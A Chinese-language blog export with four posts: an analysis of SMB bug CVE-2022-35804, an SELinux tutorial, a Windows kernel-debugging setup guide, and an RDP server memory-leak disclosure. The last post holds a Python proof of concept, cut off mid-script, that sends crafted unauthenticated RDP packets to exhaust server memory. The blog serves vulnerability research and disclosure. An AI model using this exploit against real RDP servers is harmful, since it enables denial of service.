{"meta":{"title":"VictorV的小博客","subtitle":"","description":"记录一些懒得找的东西, 和一些想写的东西","author":"VictorV","url":"http://474172261.github.io"},"pages":[],"posts":[{"title":"SMB RCE CVE-2022-35804的介绍","slug":"CVE-2022-35804","date":"2022-08-11T02:06:20.093Z","updated":"2022-08-11T06:48:03.593Z","comments":true,"path":"2022/08/11/CVE-2022-35804/","link":"","permalink":"http://474172261.github.io/2022/08/11/CVE-2022-35804/","excerpt":"2022年8月更新中出现了SMB的RCE, 微软介绍说对于server端是认证后的, 所以应该不会是历史漏洞重新出现的问题, 毕竟曾经也分析过一阵子SMB, 出现了新鲜漏洞还是需要分析分析的, 以下是一个简单的分析介绍","text":"2022年8月更新中出现了SMB的RCE, 微软介绍说对于server端是认证后的, 所以应该不会是历史漏洞重新出现的问题, 毕竟曾经也分析过一阵子SMB, 出现了新鲜漏洞还是需要分析分析的, 以下是一个简单的分析介绍 Bug首先官方介绍是压缩相关的bug, 对比srv2.sys和srvnet.sys后, 发现srvnet.sys的SmbCompressionDecompress有改动, 所以大概率是它了. 以下是相关改动: 从图中看到, 改动其实很小, 就改了最后一个传入参数. 查看MSDN对于该函数的说明: 1234567891011121314NT_RTL_COMPRESS_API NTSTATUS RtlDecompressBufferEx2( [in] USHORT CompressionFormat, [out] PUCHAR UncompressedBuffer, [in] ULONG UncompressedBufferSize, [in] PUCHAR CompressedBuffer, [in] ULONG CompressedBufferSize, [in] ULONG UncompressedChunkSize, [out] PULONG FinalUncompressedSize, [in, optional] PVOID WorkSpace);[in, optional] WorkSpaceA pointer to a caller-allocated work space buffer used by the RtlDecompressBufferEx2 function during decompression. Use the RtlGetCompressionWorkSpaceSize function to determine the correct work space buffer size. 所以可以了解到, workspace理应是caller申请的一块内存. 一般来说, 应该是如下的形式调用: 12345678if(NT_SUCCESS(RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM, &amp;CompressBufferWorkSpaceSize, &amp;CompressFragmentWorkSpaceSize)))&#123; if(WorkSpace = LocalAlloc(LPTR, CompressBufferWorkSpaceSize)) &#123; status = NT_SUCCESS(RtlDecompressBufferEx2(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM, (PUCHAR) data, size, (PUCHAR) (*compressedData), size, 4096, compressedSize, WorkSpace)); LocalFree(WorkSpace); &#125;&#125; 先调用RtlGetCompressionWorkSpaceSize获取需要的workspace的size, 然后申请对应大小的内存, 之后再调用解压缩函数. 接下来, 我们看看P到底是个什么东西.在SmbCompressionInitialize函数内, 它初始化了全局变量P: 1234567891011121314151617181920212223242526CompressionWorkSpaceSize = RtlGetCompressionWorkSpaceSize( 2u, &amp;CompressBufferWorkSpaceSize, &amp;CompressFragmentWorkSpaceSize);if ( CompressionWorkSpaceSize &lt; 0 ) goto LABEL_12;v1 = 0;if ( CompressBufferWorkSpaceSize ) v1 = CompressBufferWorkSpaceSize;CompressionWorkSpaceSize = RtlGetCompressionWorkSpaceSize( 3u, &amp;CompressBufferWorkSpaceSize, &amp;CompressFragmentWorkSpaceSize);if ( CompressionWorkSpaceSize &lt; 0 ) goto LABEL_12;if ( CompressBufferWorkSpaceSize &gt; v1 ) v1 = CompressBufferWorkSpaceSize;CompressionWorkSpaceSize = RtlGetCompressionWorkSpaceSize( 4u, &amp;CompressBufferWorkSpaceSize, &amp;CompressFragmentWorkSpaceSize);if ( CompressionWorkSpaceSize &lt; 0 ) goto LABEL_12;if ( CompressBufferWorkSpaceSize &gt; v1 ) v1 = CompressBufferWorkSpaceSize;P = (PVOID)PplCreateLookasideList(0, 0, v1, 0x2532534Cu, v3, 0x2532534Cu); 可以看到, 它应该是放入了3种压缩类型所需要的size中最大的那一个, 这样在需要的时候, 申请最大的那个size的workspace就好了. 由于程序员错误的使用, 不小心传入了P, 导致了类型混淆, 从而造成了对P的写入问题. History在windows 10 1909的代码中, SmbCompressionDecompress是这样实现的: 123456if ( RtlGetCompressionWorkSpaceSize(v13, &amp;CompressBufferWorkSpaceSize, (PULONG)CompressFragmentWorkSpaceSize) &lt; 0 || (PoolWithTag = ExAllocatePoolWithTag((POOL_TYPE)512, CompressBufferWorkSpaceSize, 0x2532534Cu)) != 0i64 )&#123; v10 = RtlDecompressBufferEx2(v13, a4, (unsigned int)a5, a2, a3, 0, a6, PoolWithTag); if ( PoolWithTag ) ExFreePoolWithTag(PoolWithTag, 0x2532534Cu); 可见没有任何问题, 在windows 10 2004里, 开始变了模样, 但是参数传递是修补后的样子. 之前保存过windows 20211(发布于2020年9月)的srvnet.sys文件, 发现它是传递了P, 所以可以看到, 这个bug应该某个开发版引入的, 一直延续到了windows 11. 有意思的是, 它的变量类型是PVOID, 而P也是PVOID, 所以编译器不会有任何警告. 理论上只要有任何测试触发这个位置, 这块代码都有可能会崩溃, 但是直到如今, 才被爆出来, 也是出人意料的, 可见微软内部的安全审计依然不到位(也许就没有). 我想微软之所以那么改, 可能是为了提高内存利用效率, 避免频繁的申请内存吧, 没想到搞出这等幺蛾子, 哈哈哈 影响好在, 自从windows 爆出过压缩部分的bug后, 它已经要求server端先验证, 后压缩, 使得bug只能是认证后才能触发. 但是Client端还是会受影响的, 毕竟client主动连的server, 也就不存在认证限制了.","categories":[],"tags":[],"keywords":[]},{"title":"SELinux 简介","slug":"SELinux","date":"2022-06-17T11:38:05.968Z","updated":"2022-05-09T07:42:34.136Z","comments":true,"path":"2022/06/17/SELinux/","link":"","permalink":"http://474172261.github.io/2022/06/17/SELinux/","excerpt":"测试中时常涉及到SELinux, 但是又不太懂咋回事. 学习一下, 整理出来, 希望可以帮到有疑惑的人","text":"测试中时常涉及到SELinux, 但是又不太懂咋回事. 学习一下, 整理出来, 希望可以帮到有疑惑的人 默认情况下, linux的权限隔离是依据用户的权限来划分的, 称为自主访问控制(DAC). 而SELinux是根据进程和资源划分类和访问权限的. 两者不矛盾, 可以一起存在. 准备工作要使用和管理selinux, 需要一些命令, 需要安装一下: 以centos7为例: sesearch: yum install setools-console semanage: 12345678$ yum provides semanage...policycoreutils-python-2.5-34.el7.x86_64 : SELinux policy core python utilitiesRepo : baseMatched from:Filename : /usr/sbin/semanage$ yum install policycoreutils-python-2.5-34.el7.x86_64 sealert: 与semanage类似. 比如centos7是yum install setroubleshoot-server-3.2.30-8.el7.x86_64. 当然没有它也不要紧. 工作模式 enforcing：强制模式。违反 SELinux 规则的行为将被阻止并记录到日志中。 permissive：宽容模式。违反 SELinux 规则的行为只会记录到日志中。一般为调试用。 disabled：关闭 SELinux。 通过命令getenforce可以查看当前状态, 通过setenforce可以更改它. Ubuntu如果没有命令, 可以apt install selinux-utils安装. 默认情况下Ubuntu不启用SELinux, 而是apparmor 查看规则使用sesearch -A可以查看所有允许的规则. (非”允许规则”就是不允许) 举例: 12$ sesearch -A|grep syslogd_tallow syslogd_t tmp_t : dir &#123; ioctl read write getattr lock add_name remove_name search open &#125; ; 格式为ALLOW (src type) (dst type):class &#123; allowed attributes &#125;; 通过chcon -u aaa_u -r bbb_r -t ccc_t test可以临时修改文件的规则 semanage fcontext --list 可以查看文件或者文件夹对于的type规则. semodule -l可以查看已经安装的module里封装的规则 123456789101112131415$ semodule -l...varnishd 1.2.0vdagent 1.1.1vhostmd 1.1.0virt 1.5.0vlock 1.2.0vmtools 1.0.0vmware 2.7.0vnstatd 1.1.0vpn 1.16.0w3c 1.1.0watchdog 1.8.0wdmd 1.1.0... 如果我们想了解vmtools的规则, 可以这样: 1$ semodule -E vmtools 执行完成后, 可以看到目录下生成了vmtools.pp文件. 使用sedismod查看规则: 12345678910111213141516171819202122232425262728293031323334353637$ sedismod vmtools.ppReading policy...libsepol.policydb_index_others: security: 0 users, 4 roles, 112 types, 4 boolslibsepol.policydb_index_others: security: 1 sens, 1024 catslibsepol.policydb_index_others: security: 101 classes, 0 rules, 0 cond ruleslibsepol.policydb_index_others: security: 0 users, 4 roles, 112 types, 4 boolslibsepol.policydb_index_others: security: 1 sens, 1024 catslibsepol.policydb_index_others: security: 101 classes, 0 rules, 0 cond rulesBinary policy module file loaded.Module name: vmtoolsModule version: 1.0.0Select a command:1) display unconditional AVTAB2) display conditional AVTAB3) display users4) display bools5) display roles6) display types, attributes, and aliases7) display role transitions8) display role allows9) Display policycon0) Display initial SIDsa) Display avrule requirementsb) Display avrule declarationsc) Display policy capabilitiesl) Link in a moduleu) Display the unknown handling settingF) Display filename_trans rulesf) set output filem) display menuq) quitCommand (&#x27;m&#x27; for menu): 这里我们输入1, 显示unconditional规则 123456789101112131415161718unconditional avtab:--- begin avrule block ---decl 1: allow vmtools_t vmtools_exec_t : [file] &#123; entrypoint &#125;; allow vmtools_t vmtools_exec_t : [file] &#123; ioctl read getattr lock map execute execute_no_trans open &#125;; type_transition [initrc_domain] vmtools_exec_t : [process] vmtools_t; allow vmtools_helper_t vmtools_helper_exec_t : [file] &#123; entrypoint &#125;; allow vmtools_helper_t vmtools_helper_exec_t : [file] &#123; ioctl read getattr lock map execute execute_no_trans open &#125;; allow vmtools_t self : [capability] &#123; sys_rawio sys_time &#125;; allow vmtools_t self : [fifo_file] &#123; ioctl read write getattr lock append open &#125;; allow vmtools_t self : [unix_stream_socket] &#123; ioctl read write create getattr setattr lock append bind connect listen accept getopt setopt shutdown &#125;; allow vmtools_t self : [unix_dgram_socket] &#123; ioctl read write create getattr setattr lock append bind connect getopt setopt shutdown &#125;; allow vmtools_t vmtools_tmp_t : [dir] &#123; ioctl read write getattr lock add_name remove_name search open &#125;; allow vmtools_t vmtools_tmp_t : [dir] &#123; ioctl read write create getattr setattr lock unlink link rename add_name remove_name reparent search rmdir open &#125;; allow vmtools_t vmtools_tmp_t : [dir] &#123; ioctl read write getattr lock add_name remove_name search open &#125;; allow vmtools_t vmtools_tmp_t : [file] &#123; ioctl read write create getattr setattr lock append unlink link rename open &#125;; allow vmtools_t vmtools_tmp_t : [dir] &#123; ioctl read .... Security Context 进程的type也称为Domain. unconfined_t是无限制的domain. 一般登录用户启动的程序为这个domain. ls -Z可以查看文件的security context. 1234[root@localhost vv]# ls -Z /root/-rw-------. root root system_u:object_r:admin_home_t:s0 anaconda-ks.cfg-rw-r--r--. root root system_u:object_r:admin_home_t:s0 initial-setup-ks.cfg-rw-r--r--. root root unconfined_u:object_r:admin_home_t:s0 t2 ps -auxZ可以查看进程的security context. 1234system_u:system_r:kernel_t:s0 root 569 0.0 0.0 0 0 ? S&lt; May04 0:00 [xfs-eofblocks/s]system_u:system_r:kernel_t:s0 root 572 0.0 0.0 0 0 ? S May04 0:00 [xfsaild/sda1]system_u:system_r:auditd_t:s0 root 654 0.0 0.0 55504 460 ? S&lt;sl May04 0:00 /sbin/auditdsystem_u:system_r:audisp_t:s0 root 656 0.0 0.0 84548 580 ? S&lt;sl May04 0:00 /sbin/audispd Domain Transition假如进程A属于Domain a, 它启动了一个程序X, 程序X启动后的Domain是Domain b. 我们就称之为Domain Transition. 实现这个需要满足3个前提: Domain a 和Domain b有程序文件X的 execute 属性 Domain a允许迁移到Domain b. (即 process transition 属性) 文件X是Domain b的 entrypoint. 比如 12$ sesearch -A|grep vmtools_t|grep entrypoint allow vmtools_t vmtools_exec_t : file &#123; ioctl read getattr lock map execute execute_no_trans entrypoint open &#125; ; 如果是在pp文件里, 就形如 type_transition [initrc_domain] vmtools_exec_t : [process] vmtools_t; 举例: init_t到httpd_t的Domain Transition: 先查看vftpd的文件和进程的security context: 1234[root@localhost ~]# ls -Z /usr/sbin/vsftpd-rwxr-xr-x. root root system_u:object_r:ftpd_exec_t:s0 /usr/sbin/vsftpd[root@localhost ~]# ps -auxZ|grep vftpdsystem_u:object_r:ftpd_t:s0-s0:c0.c1023 root 2829 0.0 0.0 112660 964 pts/1 R+ 07:42 0:00 grep --color=auto vftpd 可以看到文件是ftpd_exec_t type, 进程的domain是ftpd_t( 如果没有配置SELinux, 进程的security context可能是unconfined_u:unconfined_r:unconfined_t) 接下来查看init_t到ftpd_exec_t的规则: 123[root@localhost ~]# sesearch -s init_t -t ftpd_exec_t -c file -p execute -AdFound 1 semantic av rules: allow init_t ftpd_exec_t : file &#123; read getattr execute open &#125; ; 可以看到init_t有ftpd_exec_t Type的execute属性 123[root@localhost ~]# sesearch -s ftpd_t -t ftpd_exec_t -c file -p entrypoint -AdFound 1 semantic av rules: allow ftpd_t ftpd_exec_t : file &#123; ioctl read getattr lock execute execute_no_trans entrypoint open &#125; ; 可以看到ftpd_t有ftpd_exec_t Type的execute属性 123[root@localhost ~]# sesearch -s init_t -t ftpd_t -c process -p transition -AdFound 1 semantic av rules: allow init_t ftpd_t : process transition ; 错误信息的处理通过ausearch命令可以获取错误消息. 也可以直接读取/var/log/audit/audit.log, 带有AVC(Access Vector Cache, 很奇葩的名字)的就是拒绝的log. 比如: 执行runcon system_u:system_r:syslogd_t:s0 /bin/ls -l /会失败, 查看错误结果: 12$ ausearch -m AVC,USER_AVC,SELINUX_ERR,USER_SELINUX_ERR|grep runcontype=AVC msg=audit(1651855998.065:528): avc: denied &#123; entrypoint &#125; for pid=4634 comm=&quot;runcon&quot; path=&quot;/usr/bin/ls&quot; dev=&quot;dm-0&quot; ino=25307027 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:bin_t:s0 tclass=file avc: denied - the action performed by SELinux and recorded in Access Vector Cache (AVC) &#123; entrypoint&#125; - the denied action pid=4634- the process identifier of the subject that tried to perform the denied action comm=&quot;runcon&quot; - the name of the command that was used to invoke the analyzed process syslogd_t - the SELinux type of the process bin_t - the SELinux type of the object affected by the process action tclass=file - the target object class 翻译一下就是, 进程runcon(pid:4634)下从syslogd_t类型去运行bin_t类型的 “&#x2F;usr&#x2F;bin&#x2F;ls”文件时, syslogd_t没有该文件的entrypoint权限. 这是为什么呢? 我的猜想是, runcon由于是用户启动的, 所以在unconfined_t域, runcon会调用setexeccon, 该函数功能是在下一次执行execve的时候, 更改加载程序的security context. 这个操作应该会触发一个Domain Transition, 从unconfined_t 到 syslogd_t, 而Domain Transition有3个前提, 其中一个是就是需要目标domain有文件的entrypoint属性. 而syslogd_t没有bint_t的entrypoint属性. 从而导致没有权限. 添加规则使用audit2allow可以生成规则建议: 12345678[root@localhost ~]# ausearch -m AVC|grep runcontype=AVC msg=audit(1651857472.707:540): avc: denied &#123; entrypoint &#125; for pid=4774 comm=&quot;runcon&quot; path=&quot;/usr/bin/ls&quot; dev=&quot;dm-0&quot; ino=25307027 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:bin_t:s0 tclass=file[root@localhost ~]# ausearch -m AVC|grep runcon|audit2allow -a#============= syslogd_t ==============#!!!! WARNING: &#x27;bin_t&#x27; is a base type.allow syslogd_t bin_t:file entrypoint; 生成规则: 12345$ ausearch -m AVC|grep runcon|audit2allow -M test2******************** IMPORTANT ***********************To make this policy package active, execute:semodule -i test2.pp 它会生成两个文件test2.pp和test2.te, te文件就是规则的实际描述文件, 安装规则: semodule -i test2.pp 安装后查看: 123[root@localhost ~]# sesearch -A|grep syslogd_t|grep entrypoint allow syslogd_t bin_t : file &#123; ioctl read getattr lock map execute execute_no_trans entrypoint open &#125; ; allow syslogd_t syslogd_exec_t : file &#123; ioctl read getattr lock map execute execute_no_trans entrypoint open &#125; ; 可以看到规则已经添加进去了. ALLOWING ACCESS: AUDIT2ALLOW WRITING A CUSTOM SELINUX POLICY 其它通过runcon可以以特定domain运行特定程序 参考An Introduction to SELinux on CentOS 7 – Part 2: Files and Processes WRITING A CUSTOM SELINUX POLICY","categories":[],"tags":[],"keywords":[]},{"title":"使用workstation配置 Windows 内核调试","slug":"windows-debug-setting","date":"2022-06-17T11:38:05.968Z","updated":"2022-02-23T02:43:05.802Z","comments":true,"path":"2022/06/17/windows-debug-setting/","link":"","permalink":"http://474172261.github.io/2022/06/17/windows-debug-setting/","excerpt":"本篇讲如何简单配置windows内核调试. 使用虚拟机调试windows 的方法分为两种, 一种是pipe, 一种是网络.","text":"本篇讲如何简单配置windows内核调试. 使用虚拟机调试windows 的方法分为两种, 一种是pipe, 一种是网络. pipe方法添加串口到虚拟机安装好虚拟机后, 添加串口设配, 配置如下 配置虚拟机windows系统(简称Guest)按组合键win+r, 输入 msconfig.做如下配置重启虚拟机 配置外部主机(检查Host)找到windbg的快捷方式, 右键属性, 添加参数-b -k com:port=\\\\.\\pipe\\com_1,baud=115200,pipe” 连接调试器在Guest启动后, 在Host打开刚才设置的windbg快捷方式, 如下便连接成功 添加符号 网络方法假设虚拟机是windows 10, ip 为 192.168.170.12, 主机ip为 192.168.170.1, 在虚拟机中使用管理员打开powershell, 执行以下命令: 1234567PS C:\\Windows\\system32&gt; Bcdedit /set dbgtransport kdnet.dll操作成功完成。PS C:\\Windows\\system32&gt; Bcdedit /debug yes操作成功完成。PS C:\\Windows\\system32&gt; Bcdedit /dbgsettings net hostip:192.168.170.1 port:50110Key=3tiyrjeh9h9w5.19vgro94onrdc.1wckyll43kv3r.yf1gyp2ymc3nPS C:\\Windows\\system32&gt; 此处使用的port是 50110, 设置后会出现一个key.设置好后重启一下虚拟机, 重启后, 在主机使用以下命令连接虚拟机: 1WinDBG -k net:port=50110,key=3tiyrjeh9h9w5.19vgro94onrdc.1wckyll43kv3r.yf1gyp2ymc3n hyper-v的hypervisor调试配置12bcdedit /set hypervisordebug onbcdedit /hypervisorsettings NET HOSTIP:192.168.170.1 PORT:50000","categories":[],"tags":[],"keywords":[]},{"title":"Windows 远程桌面服务端(RDP server) 内存泄露分享","slug":"rdp_mem_leak_bug","date":"2022-06-17T11:38:05.968Z","updated":"2020-08-26T05:48:20.133Z","comments":true,"path":"2022/06/17/rdp_mem_leak_bug/","link":"","permalink":"http://474172261.github.io/2022/06/17/rdp_mem_leak_bug/","excerpt":"在7月的时候发现了个rdp的内存泄露bug, 微软MSRC决定不管这个bug, 所以我就公开了, 顺便分享一下分析的一些细节, 供大家学习交流 :)","text":"在7月的时候发现了个rdp的内存泄露bug, 微软MSRC决定不管这个bug, 所以我就公开了, 顺便分享一下分析的一些细节, 供大家学习交流 :) RDP协议实现的简介开启远程桌面在windows中, 可以使用下图的选项去实现开启远程桌面 如果不勾选红圈选中的这个选项, 那么在进行登录的用户名和密码交换前, 需要进行一些协议的协商操作; 如果勾选了这个选项, 则会先使用用户名和密码实现一条加密通道, 之后再通过加密通道完成协商. 一个理想的协议实现就应该是后者那样, 连接前用户毕竟都知道用户名和密码了, 那么创建加密通道后再协商应该是最好的, 而不是先协商再认证. 当然, 作为攻击者, 肯定不希望是后者, 那样攻击面变得更小了. 前期的交互如同上图显示的那样, 双方需要经过多次协商, 才能进入后续的认证操作. 在Connection Initial PDU里, 我们需要声明我们要申请的virtual channel, 之后在channel join PDU里请求加入声明的channel. 在完成了图中所有步骤后, 我们就可以发送数据到virtual channel了. 在给virtual channel发送数据前, 并没有完成用户名和密码的认证, 所以, 如果没有勾选红圈的选项, 我们可以在没有用户名&#x2F;密码的情况下发送数据到virtual channel. Virtual Channelwindows 处理virtual channel 数据的路径为 WDW_OnDataReceived -&gt; WDICART_IcaChannelInputEx -&gt; CRDPWDUMXStack::WDCallback_IcaChannelInput -&gt; CRDPWDUMXStack::OnVirtualChannelData. windows 10 内部有多个virtual channel, 在完成完整认证前, 主要能访问的是如下几个channel: 123456789rdpinptrdpgrfxrdpcmd rdplicrdpdrechoMicrosoft::Windows::RDS::TelemetryMicrosoft::Windows::RDS::BasicInputdrdynvc 此处仅列出部分channel, 下文也只涉及此处列出的channel, 未涉及的可以自己研究一下. 不同的channel有不同的访问方式, 可以通过向channel “drdynvc” 发送channel名称, 来发送数据到名称指定的virtual channel( 支持此方式的channel有 drdynvc, Microsoft::Windows::RDS::BasicInput, Microsoft::Windows::RDS::Telemetry, 还有一些未在上表列出的);另一种方式是通过直接提供channel ID, 发送数据到其它channel. 最终, 他们会调用到CRdpDynVC::OnDataReceived函数来调用给定channel对应的动态处理函数. 当然, 前提是channel已经被open了, 如果没有open, 你可以通过发送type为1的命令到drdynvc去open指定channel. BUG这个bug存在于server 处理 rdplic 通道消息的CUMRDPLicPlugin::HandleClientLicensePdu函数中. 函数大致如下: 12345678910111213int CUMRDPLicPlugin::HandleClientLicensePdu(CUMRDPLicPlugin *this, unsigned int a2, __int64 a3)&#123; v5 = this; if ( a3 &amp;&amp; a2 &gt;= 9 &amp;&amp; (mem_size = *(unsigned int *)(a3 + 4), mem_size &lt;= (unsigned __int64)a2 - 8) )&#123; v9 = operator new[](mem_size); v5-&gt;f_18h.f_8h.memory_60h = (__int64)v9; if ( v9 )&#123; memcpy_0(v9, (const void *)(a3 + 8), *(unsigned int *)(a3 + 4)); ... SetEvent((HANDLE)v5-&gt;f_18h.f_8h.Event_50h); return 0; &#125; &#125;&#125; 表面看起来没什么问题, 问题出在它在set了event后, 并没有触发event的处理函数来处理这片内存, 如果我们再次发送相同的命令, 就会把 v5-&gt;f_18h.f_8h.memory_60h 位置的指针覆盖, 导致原来的内存指针丢失, 从而造成永久的内存泄露(除非重启服务). 漏洞潜在影响当有人启用RDP并关闭安全选项时, 存在被远程恶意耗尽内存的风险, 导致系统缓慢, 服务无法正常执行. 如果开着RDP也开着安全选项, 但是存在弱用户名密码, 也可能被恶意耗尽内存. POCpoc并没有使用CredSSP认证, 需要在测试时在server端关闭红圈中的选项.此处我使用了4个线程去跑, 一个是因为服务端会有一个定时器, 在长时间没有完成认证的情况下, 会主动中断连接, 而我们发送数据时并没有完成认证, 所以需要重新连接. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198#coding:utf-8import socket, sys, structfrom OpenSSL import SSLimport threadingimport timedef send_init_packets(host): data = &#x27;\\x03\\x00\\x00\\x13\\x0e\\xe0\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x08\\x00\\x01\\x00\\x00\\x00&#x27; s = socket.socket() s.connect((host, 3389)) s.sendall(data) s.recv(8192) ctx = SSL.Context(SSL.TLSv1_METHOD) tls = SSL.Connection(ctx,s) tls.set_connect_state() tls.do_handshake() return tlsdef send_client_data(tls): # add multitransport p2 = &#x27;\\x06\\xc0\\x08\\x00\\x00\\x00\\x00\\x00&#x27;+&#x27;\\x0a\\xc0\\x08\\x00\\x00\\x02\\x00\\x00&#x27; # flag SOFTSYNC_TCP_TO_UDP p = &quot;\\x03\\x00\\x01\\xca\\x02\\xf0\\x80\\x7f\\x65\\x82\\x07\\xc2\\x04\\x01\\x01\\x04\\x01\\x01\\x01\\x01\\xff\\x30\\x19\\x02\\x01\\x22\\x02\\x01\\x02\\x02\\x01\\x00\\x02\\x01\\x01\\x02\\x01\\x00\\x02\\x01\\x01\\x02\\x02\\xff\\xff\\x02\\x01\\x02\\x30\\x19\\x02\\x01\\x01\\x02\\x01\\x01\\x02\\x01\\x01\\x02\\x01\\x01\\x02\\x01\\x00\\x02\\x01\\x01\\x02\\x02\\x04\\x20\\x02\\x01\\x02\\x30\\x1c\\x02\\x02\\xff\\xff\\x02\\x02\\xfc\\x17\\x02\\x02\\xff\\xff\\x02\\x01\\x01\\x02\\x01\\x00\\x02\\x01\\x01\\x02\\x02\\xff\\xff\\x02\\x01\\x02\\x04\\x82\\x01\\x61\\x00\\x05\\x00\\x14\\x7c\\x00\\x01\\x81\\x48\\x00\\x08\\x00\\x10\\x00\\x01\\xc0\\x00\\x44\\x75\\x63\\x61\\x81\\x34\\x01\\xc0\\xea\\x00\\x0a\\x00\\x08\\x00\\x80\\x07\\x38\\x04\\x01\\xca\\x03\\xaa\\x09\\x04\\x00\\x00\\xee\\x42\\x00\\x00\\x44\\x00\\x45\\x00\\x53\\x00\\x4b\\x00\\x54\\x00\\x4f\\x00\\x50\\x00\\x2d\\x00\\x46\\x00\\x38\\x00\\x34\\x00\\x30\\x00\\x47\\x00\\x49\\x00\\x4b\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\xca\\x01\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x0f\\x00\\xaf\\x07\\x62\\x00\\x63\\x00\\x37\\x00\\x38\\x00\\x65\\x00\\x66\\x00\\x36\\x00\\x33\\x00\\x2d\\x00\\x39\\x00\\x64\\x00\\x33\\x00\\x33\\x00\\x2d\\x00\\x34\\x00\\x31\\x00\\x39\\x38\\x00\\x38\\x00\\x2d\\x00\\x39\\x00\\x32\\x00\\x63\\x00\\x66\\x00\\x2d\\x00\\x00\\x31\\x00\\x62\\x00\\x32\\x00\\x64\\x00\\x61\\x00\\x42\\x42\\x42\\x42\\x07\\x00\\x01\\x00\\x00\\x00\\x56\\x02\\x00\\x00\\x50\\x01\\x00\\x00\\x00\\x00\\x64\\x00\\x00\\x00\\x64\\x00\\x00\\x00\\x04\\xc0\\x0c\\x00\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\xc0\\x0c\\x00\\x1b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\xc0\\x38\\x00\\x04\\x00\\x00\\x00\\x72\\x64\\x70\\x73\\x6e\\x64\\x00\\x00\\x0f\\x00\\x00\\xc0\\x63\\x6c\\x69\\x70\\x72\\x64\\x72\\x00\\x00\\x00\\xa0\\xc0\\x64\\x72\\x64\\x79\\x6e\\x76\\x63\\x00\\x00\\x00\\x80\\xc0&quot;+&#x27;rdplic\\x00\\x00&#x27;+&quot;\\x00\\x00\\x00\\x00&quot;+p2 tpkt_size = struct.pack(&quot;&gt;h&quot;, len(p)) ber_size = struct.pack(&quot;&gt;h&quot;, len(p)-12) initial_userdata_size = struct.pack(&quot;&gt;h&quot;, len(p)-109) connectPDU_size = struct.pack(&quot;&gt;h&quot;, len(p)-118) userdata_value_size = struct.pack(&quot;&gt;h&quot;, len(p)-132) cs_net_size = struct.pack(&quot;&gt;h&quot;, len(p)-390 - len(p2)) ba = bytearray() ba.extend(map(ord, p)) ba[2] = tpkt_size[0] ba[3] = tpkt_size[1] ba[10] = ber_size[0] ba[11] = ber_size[1] ba[107] = initial_userdata_size[0] ba[108] = initial_userdata_size[1] ba[116] = 0x81 ba[117] = connectPDU_size[1] ba[130] = 0x81 ba[131] = userdata_value_size[1] ba[392] = cs_net_size[1] tls.sendall(bytes(ba)) tls.recv(8192)def send_client_info(tls): p = b&quot;\\x03\\x00\\x01\\x61\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x81\\x52\\x40\\x00\\xa1\\xa5\\x09\\x04\\x09\\x04\\xbb\\x47\\x03\\x00\\x00\\x00\\x0e\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x41\\x00\\x00\\x00\\x74\\x00\\x65\\x00\\x73\\x00\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x1c\\x00\\x31\\x00\\x39\\x00\\x32\\x00\\x2e\\x00\\x41\\x41\\x41\\x00\\x38\\x00\\x2e\\x00\\x32\\x00\\x33\\x00\\x32\\x00\\x2e\\x00\\x31\\x00\\x00\\x00\\x40\\x00\\x43\\x00\\x3a\\x00\\x5c\\x00\\x57\\x00\\x49\\x00\\x4e\\x00\\x41\\x41\\x41\\x00\\x57\\x00\\x53\\x00\\x5c\\x00\\x73\\x00\\x79\\x00\\x73\\x00\\x74\\x00\\x65\\x00\\x6d\\x00\\x33\\x00\\x32\\x00\\x5c\\x00\\x6d\\x00\\x73\\x00\\x74\\x00\\x73\\x00\\x63\\x00\\x61\\x00\\x78\\x00\\x2e\\x00\\x64\\x00\\x6c\\x00\\x6c\\x00\\x00\\x00\\xa4\\x01\\x00\\x00\\x4d\\x00\\x6f\\x00\\x75\\x00\\x6e\\x00\\x74\\x00\\x61\\x00\\x69\\x00\\x6e\\x00\\x20\\x00\\x53\\x00\\x74\\x00\\x61\\x00\\x6e\\x00\\x64\\x00\\x61\\x00\\x72\\x00\\x64\\x00\\x20\\x00\\x54\\x00\\x69\\x00\\x6d\\x00\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0b\\x00\\x00\\x00\\x01\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x4d\\x00\\x6f\\x00\\x75\\x00\\x6e\\x00\\x74\\x00\\x61\\x00\\x69\\x00\\x6e\\x00\\x20\\x00\\x44\\x00\\x61\\x00\\x79\\x00\\x6c\\x00\\x69\\x00\\x67\\x00\\x68\\x00\\x74\\x00\\x20\\x00\\x54\\x00\\x69\\x00\\x6d\\x00\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x02\\x00\\x02\\x00\\x00\\x